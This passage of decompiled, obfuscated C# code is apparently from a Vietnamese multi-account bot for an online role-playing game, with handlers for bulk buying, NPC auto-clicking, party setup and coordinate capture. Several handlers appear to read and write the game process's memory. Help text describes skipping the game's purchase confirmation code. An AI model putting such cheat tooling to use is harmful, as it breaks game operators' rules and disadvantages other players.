		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		bool_23 = false;
		string_23 = Class85.smethod_34(characterAccountConfig_1[num]);
		comboBoxMuaVatpham.Items.Clear();
		if (string_23 != null)
		{
			Array.Sort(string_23);
			for (int i = 0; i < string_23.Length; i++)
			{
				comboBoxMuaVatpham.Items.Add(Class1.smethod_1(string_23[i], 1));
			}
		}
		Thread.Sleep(10);
		bool_23 = true;
	}

	private void comboBoxMuaVatpham_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || string_23 == null)
		{
			return;
		}
		string text = comboBoxMuaVatpham.Text;
		for (int i = 0; i < string_23.Length; i++)
		{
			if (text == Class1.smethod_1(string_23[i], 1))
			{
				string_25 = string_23[i];
				Class66.smethod_11(Class66.smethod_1(), "NameMuaGop", string_25, "", 0);
				break;
			}
		}
	}

	private void pictureBoxQC_Click(object sender, EventArgs e)
	{
		if (Class26.gstruct14_0 == null || pictureBoxQC.ImageLocation == string.Empty || pictureBoxQC.ImageLocation == null)
		{
			return;
		}
		if (Class26.gstruct14_0.Length <= int_145 || Class26.gstruct14_0[int_145].string_2 == null || Class26.gstruct14_0[int_145].string_2 == string.Empty)
		{
			int_145 = -1;
			for (int i = 0; i < Class26.gstruct14_0.Length; i++)
			{
				if (Class26.gstruct14_0[i].string_2 != null && Class26.gstruct14_0[i].string_2 != string.Empty)
				{
					int_145 = i;
					break;
				}
			}
		}
		if (int_145 >= 0)
		{
			string text = Environment.GetEnvironmentVariable("programfiles") + "\\Google\\Chrome\\Application\\chrome.exe";
			if (!Class11.smethod_17(text))
			{
				text = Class66.smethod_0();
			}
			Class24.smethod_40(text, "", Class26.gstruct14_0[int_145].string_2, 0);
		}
	}

	private void textBoxIdMua_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_132 = Class11.smethod_11(textBoxIdMua.Text);
			}
		}
	}

	private void buttonHelp_Click(object sender, EventArgs e)
	{
		string text = FormVideoHelp.string_5;
		text = text + "|==============================================|PHIÊN BẢN MỚI:||" + string_10;
		FormTip formTip = new FormTip();
		formTip.bool_7 = true;
		formTip.string_4 = "/index.html";
		formTip.string_0 = text;
		formTip.string_1 = "PHIEN BAN MOI";
		formTip.Show();
	}

	private void comboBoxPk_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_104[1] = Class11.smethod_11(comboBoxPk.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxMuaDungSoluong_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_79[0] = Convert.ToByte(checkBoxMuaDungSoluong.Checked);
			Class66.smethod_11(Class66.smethod_1(), "MDSL0", int_79[0], "", 0);
		}
	}

	private void textBoxMuadungSoLuong_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_79[1] = Class11.smethod_11(textBoxMuadungSoLuong.Text);
			Class66.smethod_11(Class66.smethod_1(), "MDSL1", int_79[1], "", 0);
		}
	}

	private void buttonHelpMua_Click(object sender, EventArgs e)
	{
		string text = "HƯỚNG DẪN MUA GỘP VÀ SỬ DỤNG||1. Chọn tên vật phẩm cần mua.|2. Nhập số lượng nếu mua gộp sử dụng theo số lượng.|3. Bấm nút mua.||XỬ LÝ KHI MUA SAI VẬT PHẨM TRONG KỲ TRÂN CÁC||1. Bấm vào tab [Hậu cần -> Mua thuốc] của auto.|2. Bấm nút [ Bảo vật]|3. Lấy giá trị sai số theo hướng dẫn trong đó|Sau khi lấy xong giá trị sai số thì phần [ Event - Mua dùng ] sẽ hoạt động đúng||[v] Bỏ qua bước nhập Mã KTC:||Khi vật phẩm có mặt trong Kỳ trân các nhưng auto không chắc chắn xác định được thứ tự vật phẩm thì sẽ yêu cầu mã xác nhận (xuất hiện dòng chữ nhấp nháy trên đầu nhân vật yêu cầu nhập mã).||Nếu sau khi nhập mã, nhân vật mua được vật phẩm mà không bị diss game thì bạn có thể check mục bỏ qua để khỏi yêu cầu nhập mã lần nữa. Ngược lại nếu bị diss game thì vật phẩm này không mua được bằng auto.";
		FormTip.smethod_0(string_49, text, 600000, 420, 340, bool_8: false, base.Left, base.Top);
	}

	private void checkBoxBoquaMaKTC_CheckedChanged(object sender, EventArgs e)
	{
		bool_19 = checkBoxBoquaMaKTC.Checked;
	}

	private void buttonStopNhatqua_Click(object sender, EventArgs e)
	{
		checkBoxNhatqua.Checked = false;
		if (characterAccountConfig_1 != null)
		{
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				characterAccountConfig_1[i].gstruct49_0.int_0 = 0;
				Class75.smethod_2(characterAccountConfig_1[i], Class75.uint_13, 0, 4);
			}
		}
	}

	private void buttonTHP_Click(object sender, EventArgs e)
	{
		method_30();
	}

	private void method_30()
	{
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		int_157 = 0;
		string text = comboBoxTHP.Text;
		for (int i = 0; i < string_18.GetLength(0); i++)
		{
			if (text == string_18[i, 0])
			{
				string_57 = string_18[i, 1];
				int_157 = Class11.smethod_11(string_57);
				break;
			}
		}
		if (int_157 > 0)
		{
			int num = -1;
			string_57 = comboBoxPhuong.Text;
			for (int j = 0; j < string_19.GetLength(0); j++)
			{
				if (string_57 == string_19[j, 0])
				{
					string_57 = string_19[j, 1];
					num = j;
					break;
				}
			}
			if (int_157 == 162 && num != 3 && num != 4)
			{
				string_57 = "b¾c";
			}
			else if (int_157 == 76 && (num == 1 || num == 4))
			{
				string_57 = "®«ng|§«ng";
			}
		}
		if (Class46.characterSyncSnapshot_0.int_0 > 0)
		{
			int_156 = Class46.characterSyncSnapshot_0.int_0;
			new Thread(smethod_4).Start();
			Thread.Sleep(100);
		}
		try
		{
			for (int k = 0; k < characterAccountConfig_1.Length; k++)
			{
				if (characterAccountConfig_1[k].bool_25 && characterAccountConfig_1[k].int_136 != Class46.characterSyncSnapshot_0.int_0)
				{
					int num2 = 0;
					while (int_156 > 0 && num2 < 10)
					{
						Thread.Sleep(60);
						num2++;
					}
					int_156 = characterAccountConfig_1[k].int_136;
					new Thread(smethod_4).Start();
				}
			}
		}
		catch
		{
		}
	}

	private static void smethod_4()
	{
		int num = int_156;
		int num2 = int_157;
		string text = string_57;
		int_156 = 0;
		int num3 = Class87.smethod_3(characterAccountConfig_1, num);
		if (num3 >= 0)
		{
			if (num2 <= 0)
			{
				Class29.smethod_5(characterAccountConfig_1[num3], text);
			}
			else
			{
				Class29.smethod_7(characterAccountConfig_1[num3], num2, text);
			}
		}
	}

	private void buttonPT_Click(object sender, EventArgs e)
	{
		if (FormPT.bool_0)
		{
			FormPT.bool_0 = false;
			return;
		}
		try
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				FormPT.characterAccountConfig_0 = characterAccountConfig_1[num];
				FormPT formPT = new FormPT();
				formPT.int_0 = Cursor.Position.X;
				formPT.int_1 = Cursor.Position.Y;
				formPT.int_2 = base.Width;
				formPT.int_3 = base.Height;
				formPT.Show();
			}
		}
		catch
		{
		}
	}

	private void checkBoxBosBaobos_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_1 = Convert.ToByte(checkBoxBosBaobos.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxTHP_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23 && comboBoxTHP.Text == "Hướng dẫn")
		{
			string text = "Các bạn bấm phím tương ứng ký tự đầu tiên của tên map để nhảy nhanh đến mục cần chọn.||Ví dụ đi Sa mạc 1 thì bạn gõ số 1, đi Dương Châu thì bạn gõ chữ D .v.v..";
			FormTip.smethod_0(string_49, text, 60000, 250, 120);
		}
	}

	private void textBoxSoluongChuyenthuoc_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_76[3] = Class11.smethod_11(textBoxSoluongChuyenthuoc.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxChuyenThuocMin_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_76[2] = Class11.smethod_11(textBoxChuyenThuocMin.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxTuChuyenThuoc_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_76[0] = Convert.ToByte(checkBoxTuChuyenThuoc.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxRuongBH_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_79 = Convert.ToByte(checkBoxRuongBH.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonHDChuyenthuoc_Click(object sender, EventArgs e)
	{
		string text = Environment.GetEnvironmentVariable("programfiles") + "\\Google\\Chrome\\Application\\chrome.exe";
		if (!Class11.smethod_17(text))
		{
			text = Class66.smethod_0();
		}
		Class24.smethod_40(text, "", "https://www.youtube.com/@meleira", 0);
	}

	private void checkBoxBamPhimCong_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_76[1] = Convert.ToByte(checkBoxBamPhimCong.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxTTL_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_58 = Convert.ToByte(checkBoxTTL.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonLuuCauhinhAll_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
			string text = string.Empty;
			if (characterAccountConfig.string_23 != null && characterAccountConfig.string_23 != string.Empty)
			{
				text = characterAccountConfig.string_23 + "_";
			}
			string text2 = string_58;
			if (string_58 == null || string_58 == string.Empty)
			{
				text2 = Class56.string_8 + "\\Save";
			}
			Class11.smethod_23(text2);
			string text3 = Class56.smethod_27(text2, text + Class1.smethod_1(characterAccountConfig.string_22, 1) + ".txt");
			if (text3 != null && text3 != string.Empty)
			{
				Class56.smethod_13(characterAccountConfig, text3);
			}
		}
	}

	private void buttonDocCauhinh_Click(object sender, EventArgs e)
	{
		string text = string_58;
		if (string_58 == null || string_58 == string.Empty)
		{
			text = Class56.string_8 + "\\Save";
		}
		Class11.smethod_23(text);
		string text2 = Class56.smethod_26(text, "", "*.txt");
		if (!(text2 == string.Empty))
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				Class56.smethod_9(ref characterAccountConfig_1[num], text2);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonAchinh_Click(object sender, EventArgs e)
	{
		if (FormAchinh.bool_0)
		{
			FormAchinh.bool_0 = false;
			return;
		}
		try
		{
			FormAchinh formAchinh = new FormAchinh();
			formAchinh.int_2 = base.Left;
			formAchinh.int_3 = base.Top;
			formAchinh.int_4 = base.Width;
			formAchinh.int_5 = base.Height;
			formAchinh.Show();
		}
		catch
		{
		}
	}

	private void buttonBoss_Click(object sender, EventArgs e)
	{
		if (FormTuychon.bool_0)
		{
			FormTuychon.bool_0 = false;
			return;
		}
		try
		{
			FormTuychon.int_1 = 201;
			FormTuychon formTuychon = new FormTuychon();
			formTuychon.Show();
		}
		catch
		{
		}
	}

	private void buttonNamIm_Click(object sender, EventArgs e)
	{
		if (FormTuychon.bool_0)
		{
			FormTuychon.bool_0 = false;
			return;
		}
		try
		{
			FormTuychon.int_1 = 203;
			FormTuychon formTuychon = new FormTuychon();
			formTuychon.Show();
		}
		catch
		{
		}
	}

	private void buttonBaoBoss_Click(object sender, EventArgs e)
	{
		if (FormTuychon.bool_0)
		{
			FormTuychon.bool_0 = false;
			return;
		}
		try
		{
			FormTuychon.int_1 = 5;
			FormTuychon formTuychon = new FormTuychon();
			formTuychon.Show();
		}
		catch
		{
		}
	}

	private void checkBoxChayRunAdmin_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			Class24.int_40 = Convert.ToByte(checkBoxChayRunAdmin.Checked);
			Class66.smethod_11(Class66.smethod_1(), "RunAdmin", Class24.int_40, "", 0);
			Class24.smethod_71();
		}
	}

	private void buttonHuongdanCanhbos_Click(object sender, EventArgs e)
	{
		string text = "https://youtu.be/72eBN2IrG5Q";
		string text2 = "Phim Hướng dẫn xem ở đây:|" + text + "||* Trường hợp check vào [v] Tất cả ac luôn đến tọa độ:|Nếu muốn ac A đến tọa độ, nhưng lại không muốn ac B đến|=> Bạn phải  bấm nút < xóa > để cho ac B rỗng tọa độ nhé.||* Trường hợp kéo nhiều máy, thì ở máy phụ bạn phải lấy tọa độ trước hoặc phải check vào mục [v] Máy phụ đến tọa độ.||Lưu ý: Tất cả các chức năng trong auto, nếu là chữ màu nâu đỏ thì nó được áp dụng cho toàn cục, còn chữ đen hoặc xanh thì áp dụng cho từng ac";
		FormTip.smethod_0(string_49, text2, 600000, 360, 240, bool_8: false, base.Left, base.Top);
		string text3 = Environment.GetEnvironmentVariable("programfiles") + "\\Google\\Chrome\\Application\\chrome.exe";
		if (!Class11.smethod_17(text3))
		{
			text3 = Class66.smethod_0();
		}
		Class24.smethod_40(text3, "", text, 0);
	}

	private void checkBoxDenToadoUser_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_125[0] = Convert.ToByte(checkBoxDenToadoUser.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxDenToadoALL_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_81 = Convert.ToByte(checkBoxDenToadoALL.Checked);
			Class66.smethod_11(Class66.smethod_1(), "fDenToado", int_81, "", 0);
			checkBoxDenToadoUser.Enabled = int_81 <= 0;
		}
	}

	private void buttonXoaToado_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			characterAccountConfig_1[num].int_125 = new int[5];
			characterAccountConfig_1[num].int_124 = new int[3];
			Class56.smethod_13(characterAccountConfig_1[num]);
			textBoxToadoDen.Text = string.Empty;
		}
	}

	private void buttonLayToado_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
			int num2 = Class39.smethod_0(characterAccountConfig);
			string text = Class39.smethod_2(characterAccountConfig);
			uint[] array = Class38.smethod_30(characterAccountConfig);
			if (characterAccountConfig.int_125 != null && characterAccountConfig.int_125.Length == 5)
			{
				characterAccountConfig_1[num].int_125[2] = num2;
				characterAccountConfig_1[num].int_125[3] = (int)array[0];
				characterAccountConfig_1[num].int_125[4] = (int)array[1];
			}
			else
			{
				characterAccountConfig_1[num].int_125 = new int[5]
				{
					Convert.ToByte(checkBoxDenToadoUser.Checked),
					0,
					num2,
					(int)array[0],
					(int)array[1]
				};
			}
			characterAccountConfig_1[num].int_124 = new int[3]
			{
				num2,
				(int)array[0],
				(int)array[1]
			};
			Class56.smethod_13(characterAccountConfig_1[num]);
			string text2 = "( " + array[0] / 256 + "," + array[1] / 512 + " ) " + Class1.smethod_1(text, 1);
			textBoxToadoDen.Text = text2;
		}
	}

	private void textBoxKhoangCachAccChinh_Leave(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_27 = Class11.smethod_11(textBoxKhoangCachAccChinh.Text);
			if (int_27 < 150)
			{
				int_27 = 150;
			}
			if (textBoxKhoangCachAccChinh.Text != int_27.ToString())
			{
				textBoxKhoangCachAccChinh.Text = int_27.ToString();
			}
		}
	}

	private void textBoxKhoangCachAccChinh_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_27 = Class11.smethod_11(textBoxKhoangCachAccChinh.Text);
			if (int_27 < 150)
			{
				int_27 = 150;
			}
			Class66.smethod_11(Class66.smethod_1(), "KhoangcachAccchinh", int_27, "", 0);
		}
	}

	private void checkBoxLocTrangbiNPC_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			FormLocdoTest.int_4 = Convert.ToByte(checkBoxLocTrangbiNPC.Checked);
			Class66.smethod_11(Class66.smethod_1(), "DayLaNPC", FormLocdoTest.int_4, "", 0);
		}
	}

	private void checkBoxLocTrangbiNhapSL_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			FormLocdoTest.int_3 = Convert.ToByte(checkBoxLocTrangbiNhapSL.Checked);
			Class66.smethod_11(Class66.smethod_1(), "fCoNhapSLTest", FormLocdoTest.int_3, "", 0);
		}
	}

	private void buttonDoSat_Click(object sender, EventArgs e)
	{
		Class81.bool_1 = true;
	}

	private void checkBoxDanhHieuuy_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_101 = Convert.ToByte(checkBoxDanhHieuuy.Checked);
			Class66.smethod_11(Class66.smethod_1(), "fHieuUyTK", int_101, "", 0);
		}
	}

	private void checkBoxTKThanhTruot_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_100[0] = Convert.ToByte(checkBoxTKThanhTruot.Checked);
			Class66.smethod_11(Class66.smethod_1(), "TruotTK0", int_100[0], "", 0);
		}
	}

	private void textBoxTruotTK_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_100[1] = Class11.smethod_11(textBoxTruotTK.Text);
			if (int_100[1] < 100)
			{
				int_100[1] = 100;
			}
			if (int_100[1] > 300)
			{
				int_100[1] = 300;
			}
			Class66.smethod_11(Class66.smethod_1(), "TruotTK1", int_100[1], "", 0);
		}
	}

	private void checkBoxThanhTruotSudung_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_80 = Convert.ToByte(checkBoxThanhTruotSudung.Checked);
			Class66.smethod_11(Class66.smethod_1(), "fThanhTruotSudung", int_80, "", 0);
		}
	}

	private void linkLabelPhimCauca_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		string text = "https://youtu.be/72eBN2IrG5Q";
		Class24.smethod_40(Class66.smethod_0(), "", text, 0);
		string text2 = "Xem video hướng dẫn câu cá tại: " + Class56.string_7 + text;
		FormTip.smethod_0(string_49, text2, 600000, 250, 80);
	}

	private void buttonKyTranCac_Click(object sender, EventArgs e)
	{
		if (FormTuychon.bool_0)
		{
			FormTuychon.bool_0 = false;
			return;
		}
		try
		{
			FormTuychon.int_0 = 0;
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				FormTuychon.int_0 = characterAccountConfig_1[num].int_136;
			}
			FormTuychon.int_1 = 6;
			FormTuychon formTuychon = new FormTuychon();
			formTuychon.Show();
		}
		catch
		{
		}
	}

	private void buttonMuathuocBaovat_Click(object sender, EventArgs e)
	{
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		for (int i = 0; i < characterAccountConfig_1.Length; i++)
		{
			if (characterAccountConfig_1[i].bool_25 && characterAccountConfig_1[i].int_77 > 0)
			{
				Class36.smethod_1(characterAccountConfig_1[i], bool_0: true);
			}
		}
	}

	private void checkBoxVuotAi_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_122 = Convert.ToByte(checkBoxVuotAi.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagPhandame", int_122, "", 0);
		}
	}

	private void buttonThoatGame_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (0 <= num)
		{
			Class24.smethod_53(characterAccountConfig_1[num].process_0);
		}
		Class48.smethod_5();
	}

	private void buttonDiemTapket_Click(object sender, EventArgs e)
	{
		if (FormTapKet.bool_0)
		{
			FormTapKet.bool_0 = false;
			return;
		}
		try
		{
			FormTapKet.int_0 = 0;
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				FormTapKet.int_0 = characterAccountConfig_1[num].int_136;
			}
			FormTapKet formTapKet = new FormTapKet();
			formTapKet.int_1 = Cursor.Position.X;
			formTapKet.int_2 = Cursor.Position.Y;
			formTapKet.int_3 = base.Width;
			formTapKet.int_4 = base.Height;
			formTapKet.Show();
		}
		catch
		{
		}
	}

	private void checkBoxDiemTapket_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_120 = Convert.ToByte(checkBoxDiemTapket.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagDiemTapket", int_120, "", 0);
		}
	}

	private void checkBoxConLon_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_84[0] = Convert.ToByte(checkBoxConLon.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxBossSTKhongLamHaucan_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_134 = Convert.ToByte(checkBoxBossSTKhongLamHaucan.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonHuyenTinh_Click(object sender, EventArgs e)
	{
		if (FormHuyenTinh.bool_0)
		{
			FormHuyenTinh.bool_0 = false;
			return;
		}
		try
		{
			FormHuyenTinh.int_0 = 0;
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				FormHuyenTinh.int_0 = characterAccountConfig_1[num].int_136;
			}
			FormHuyenTinh formHuyenTinh = new FormHuyenTinh();
			formHuyenTinh.Show();
		}
		catch
		{
		}
	}

	private void buttonRaovat_Click(object sender, EventArgs e)
	{
		if (FormRaovat.bool_0)
		{
			FormRaovat.bool_0 = false;
			return;
		}
		try
		{
			FormRaovat.int_0 = 0;
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				FormRaovat.int_0 = characterAccountConfig_1[num].int_136;
			}
			FormRaovat formRaovat = new FormRaovat();
			formRaovat.Show();
		}
		catch
		{
		}
	}

	private void method_31(object sender, LinkLabelLinkClickedEventArgs e)
	{
		string text = "https://youtu.be/dleEtu8n5fY";
		Class11.string_17 = new string[1] { "Link phim Hướng dẫn: " + text };
		Class24.smethod_40(Class66.smethod_0(), "", text, 0);
	}

	private void checkBoxChoPTdanhsach_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			Class69.int_2[0] = Convert.ToByte(checkBoxChoPTdanhsach.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagChodoiPT1", Class69.int_2[0], "", 0);
		}
	}

	private void textBoxTimerPT_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			Class69.int_2[1] = Class11.smethod_11(textBoxTimerPT.Text);
			Class66.smethod_11(Class66.smethod_1(), "flagChodoiPT2", Class69.int_2[1], "", 0);
		}
	}

	private void linkLabelHelpTinsu_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		string text = "HƯỚNG DẪN CHẠY TÍN SỨ THIÊN BẢO KHỐ||Để đảm bảo PT chạy không bị rớt ac, bạn phải:|1. Check vào mục [v] Chờ đủ PT (s)|2. Check vào mục [v] PT ở Điều khiển - bảng 1.||Trong phần thiết lập PT [...] ở bảng 1, bạn chọn:||1. Check vào mục [v] Mời hoặc nhận PT theo danh sách|2. Ép tất cả ac cần chạy Tín sứ vào danh sách nhóm (bấm nút Thêm).|3. Lựa ra 1 ac trong danh sách nhóm, check vào [v] Luôn làm đội trưởng.||Xong tiến hành chạy tín sứ thiên bảo khố. Ac đội trưởng khi vào phía trong dịch quan, sẽ tự PT và kiểm tra tổ đội, nếu PT đầy đủ trong danh sách thì sẽ bắt đầu nhiệm vụ.";
		FormTip.smethod_0(string_49, text, 600000, 420, 340, bool_8: false, base.Left, base.Top);
	}

	private void checkBoxQuangThuoc_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_131[0] = Convert.ToByte(checkBoxQuangThuoc.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonQuangThuoc_Click(object sender, EventArgs e)
	{
		if (FormTuychon.bool_0)
		{
			FormTuychon.bool_0 = false;
			return;
		}
		try
		{
			FormTuychon.int_1 = 7;
			FormTuychon formTuychon = new FormTuychon();
			formTuychon.Show();
		}
		catch
		{
		}
	}

	private void buttonHelpClickNpc_Click(object sender, EventArgs e)
	{
		string text = "https://youtu.be/72eBN2IrG5Q";
		string text2 = "https://youtu.be/72eBN2IrG5Q";
		Class24.smethod_40(Class66.smethod_0(), "", text, 0);
		string text3 = "Xem 2 video hướng dẫn tại: " + Class56.string_7 + text + Class56.string_7 + text2;
		FormTip.smethod_0(string_49, text3, 600000, 250, 80);
	}

	private void buttonClickNpcSingle_Click(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			int num2 = Class75.smethod_3(characterAccountConfig_1[num], Class75.uint_48, 4);
			if (num2 <= 0)
			{
				FormClickNPC.int_10 = characterAccountConfig_1[num].int_136;
				new Thread(FormClickNPC.smethod_3).Start();
			}
		}
	}

	private void buttonClickNpcAll_Click(object sender, EventArgs e)
	{
		if (characterAccountConfig_1 == null || string_53 == null || string_53 == string.Empty)
		{
			return;
		}
		int[] array = smethod_2(textBoxClickNPCMenu.Text);
		int num = Convert.ToByte(checkBoxClickNPCmenu.Checked);
		int num2 = Class11.smethod_11(textBoxClickNPCTocdo.Text);
		int[] array2 = new int[2]
		{
			Convert.ToByte(checkBoxClickNPCSolan.Checked),
			Class11.smethod_11(textBoxClickNPCSolan.Text)
		};
		try
		{
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				characterAccountConfig_1[i].string_0 = string_53;
				characterAccountConfig_1[i].int_8 = num;
				characterAccountConfig_1[i].int_10 = num2;
				characterAccountConfig_1[i].int_7 = array2;
				characterAccountConfig_1[i].int_9 = null;
				if (array != null)
				{
					characterAccountConfig_1[i].int_9 = new int[array.Length];
					for (int j = 0; j < array.Length; j++)
					{
						characterAccountConfig_1[i].int_9[j] = array[j];
					}
				}
				if (!characterAccountConfig_1[i].bool_25 || Class75.smethod_3(characterAccountConfig_1[i], Class75.uint_48, 4) != 0)
				{
					continue;
				}
				for (int k = 0; k < 50; k++)
				{
					if (FormClickNPC.int_10 <= 0)
					{
						break;
					}
					Thread.Sleep(10);
				}
				FormClickNPC.int_10 = characterAccountConfig_1[i].int_136;
				new Thread(FormClickNPC.smethod_3).Start();
			}
		}
		catch
		{
		}
	}

	private void buttonClickNpcStopAll_Click(object sender, EventArgs e)
	{
		buttonClickNpcSingle.Enabled = true;
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		try
		{
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				Class75.smethod_2(characterAccountConfig_1[i], Class75.uint_48, 0, 4);
				characterAccountConfig_1[i].bool_8 = false;
			}
		}
		catch
		{
		}
	}

	private void buttonMuaGopAll_Click(object sender, EventArgs e)
	{
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		for (int i = 0; i < characterAccountConfig_1.Length; i++)
		{
			try
			{
				if (!characterAccountConfig_1[i].bool_47 && !characterAccountConfig_1[i].bool_51)
				{
					characterAccountConfig_1[i].bool_51 = true;
					Class42.int_0 = characterAccountConfig_1[i].int_136;
					new Thread(Class42.smethod_2).Start();
					Thread.Sleep(150);
				}
			}
			catch
			{
			}
		}
	}

	private void buttonMuaSudungAll_Click(object sender, EventArgs e)
	{
		if (characterAccountConfig_1 == null)
		{
